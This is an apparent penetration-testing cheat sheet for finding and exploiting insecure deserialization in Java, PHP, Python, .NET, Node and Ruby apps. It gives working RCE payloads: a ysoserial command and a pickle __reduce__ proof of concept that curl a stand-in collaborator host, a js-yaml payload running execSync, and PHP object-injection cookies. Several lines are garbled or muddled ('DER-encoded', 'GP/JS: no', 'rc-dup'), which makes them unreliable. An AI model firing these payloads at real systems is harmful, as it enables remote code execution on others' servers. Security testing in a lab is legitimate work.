# HOW TO TEST INSECURE DESERIALIZATION ON A TARGET (2026 expert guide)
# Serialization to object conversion = RCE class: Java, PHP, Python, .NET, Ruby, Node (YAML/JSON).

## The N ways to test (find the sink first)
1. Find input that is DER-encoded data: cookies ("user=..."), POST binary, form values, JWT-ish blobs,
   request params that begin with magic bytes (Java rO0AB, PHP O:..., .NET SGC, PickledNN). 
2. Java: cookies, sessionid, remember-me encoded base64 -> decode, look for AC ED 00 05 / rO0AB.
3. PHP: cookie 'user=O:8:"stdClass":1...' -> try object-injection gadget chains.
4. Python pickle: base64 blobs beginning with b'\\x80\\x04' -> __reduce__ RCE.
5. .NET: ViewState (__VIEWSTATE base64) + MachineKey; SOAP objects w/ SoapFormatter.
6. Node: YAML here (js-yaml unsafe load), exposed t().
7. Ruby: Marshal dump (04 08 ...), / marshal.load sinks.
8. XML: Java XStream / Flexjson - tag-based POJO constructor.
9. jsonb typed: Fastjson autotype, Jackson polymorphic ("@class").
10. GP/JS: no - surfacing the FULL candidate list: the trick is where framework-derived code
    deserializes (SessionManager, cache reads, message queues).

## Step-by-step on target
1. Snapshot cookies/params; run detect tools (java-deserialization-scanner BApp, ysoserial).
2. For each candidate blob: decode -> identify a known gadget-cast prefix.
3. Execute detection payloads from YOUR LAB against YOUR test instance only.
4. For real targets: send ONLY a "ping" (dnslog/collaborator-connected gadget) - no file drop.
5. Python/pickle: craft exploit.py def __reduce__ ... -> os.system('curl YOUR-COLLABORATOR') - lab only.

## Worked examples (concrete)
# Java cookie blob check:
echo -n '<cookie-value>' | base64 -d | xxd | head        # expect ac ed 00 05 / rO0AB...  (Java)
# Java ysoserial (on your LAB target):
java -jar ysoserial.jar CommonsCollections1 'curl http://YOUR-COLLABORATOR/x' > o
#   send o as the body:  POST /api/items  Content-Type: application/octet-stream  < o
# PHP object injection cookie:
#   cookie:  user=O:8:%22stdClass%22:1:%7Bs:4:%22evil%22;s:3:%22yes%22%3B%7D
#   then exploit a known POP gadget in the app (gadget: __wakeup/__destruct chains)
# Python pickle RCE blob (lab PoC):
python3 -c "
import pickle,os
class P:
    def __reduce__(self): return (os.system,('curl http://YOUR-COLLABORATOR/x',))
print(pickle.dumps(P()).hex())"
#   => feed that hex/base64 into the deserialize endpoint that unpickles.
# Node unsafe-yaml:
#   body:  !!js/function "function (){ return process.mainModule.require('child_process').execSync('id').toString() }"
#   (if parsed with js-yaml unsafeLoad / layout render)
# .NET ViewState:
#   __VIEWSTATE base64 -> if contains ff01 31 = serialized .NET object; test with ysoserial.net on lab.

## False positives
- A cookie that base64-decodes to random JSON (not a gadget prefix) = probably just a token/JSON, no.
- Deserialization surface exists but no gadget available in the app = note as risk, not proven RCE.
- The real test is OOB callback or rc-dup; local crash/stack print of a java classname is supportive.

## Tools
- ysoserial (Java), ysoserial.net, marshalsec, pickle tools, phpggc, myso deserialization-burp scanner.
